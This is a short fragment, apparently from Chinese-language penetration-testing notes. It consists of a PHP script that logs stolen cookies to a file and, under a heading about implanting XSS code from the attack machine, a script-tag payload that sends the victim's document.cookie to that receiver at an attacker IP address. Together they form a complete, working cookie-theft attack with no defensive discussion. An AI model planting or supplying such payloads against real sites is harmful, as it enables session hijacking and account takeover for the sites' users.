```cookie
<?php
	$cookie = $_GET['cookie'];
	$log = fopen("cookie.txt","a");
	fwrite($log,$cookie . "\n");
	fclose($log);
?>
```

## 通过渗透机植入xss代码

~~~script
<script>window.open('http://192.168.137.149/cookie_rec.php?cookie='+document.cookie')</script>
~~~





